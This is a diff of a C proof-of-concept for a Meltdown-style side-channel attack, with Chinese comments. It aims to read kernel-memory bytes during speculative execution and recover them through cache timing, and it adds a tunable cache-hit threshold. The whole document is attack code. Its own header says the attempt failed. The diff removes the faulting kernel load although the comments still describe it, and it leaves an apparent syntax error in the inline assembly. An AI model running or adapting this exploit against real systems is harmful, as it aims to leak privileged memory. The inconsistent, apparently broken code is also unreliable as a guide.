@@ -1,3 +1,9 @@
+/*
+ * 先故意触发一次内核地址段错，在瞬态期间去指定内核地址偷数据
+ *
+ * 实验结果：无法窃取到字符串
+ */
+
 #define _GNU_SOURCE
 
 #include <stdio.h>
@@ -24,7 +30,6 @@ void flush_cache()
     }
 }
 
-
 extern char stopspeculate[];
 
 static void __attribute__((noinline)) victim(unsigned long secret_addr)
@@ -37,9 +42,8 @@ static void __attribute__((noinline)) victim(unsigned long secret_addr)
         ".endr\n\t"
 
         /* 访问内核地址（故意触发异常），会导致段错误（SIGSEGV） */
-        "mov (%[kaddr]), %%rax\n\t"
 
-        /* 异常架构化前的瞬态执行，访问用户态 secret 地址并编码 */
+        /* 异常架构化前的瞬态执行，访问内核态 secret 地址并编码 */
         "movzbl (%[saddr]), %%eax\n\t"
         "shl $12, %%rax\n\t"
         "movb (%[target], %%rax, 1), %%al\n\t"
@@ -50,8 +54,7 @@ static void __attribute__((noinline)) victim(unsigned long secret_addr)
         "nop\n\t"
         :
         : [target] "r"(channel),
-          [saddr]  "r"(secret_addr),
-          [kaddr]  "r"(0xffff000000000000UL)  // 故意访问内核地址
+          [saddr] "r"(secret_addr),
         : "rax", "cc", "memory");
 }
 
@@ -128,21 +131,29 @@ int main(int argc, char *argv[])
     int ret, i;
     unsigned long addr = 0, size = 0;
 
-    if (argc >= 3)
+    if (argc == 3 || argc == 4)
     {
+        // 解析地址和大小
         sscanf(argv[1], "%lx", &addr);
         sscanf(argv[2], "%lx", &size);
+
+        // 如果有第三个参数，解析 cache_hit_threshold
+        if (argc == 4)
+        {
+            sscanf(argv[3], "%d", &cache_hit_threshold);
+        }
     }
     else
     {
-        fprintf(stderr, "Usage: %s <hex_addr> <length>\n", argv[0]);
+        fprintf(stderr, "Usage: %s <hex_addr> <length> [cache_hit_threshold]\n", argv[0]);
         return 1;
     }
 
     memset(channel, 1, sizeof(channel));
 
     ret = set_signal();
-    if (ret != 0) {
+    if (ret != 0)
+    {
         perror("set_signal");
         return 1;
     }
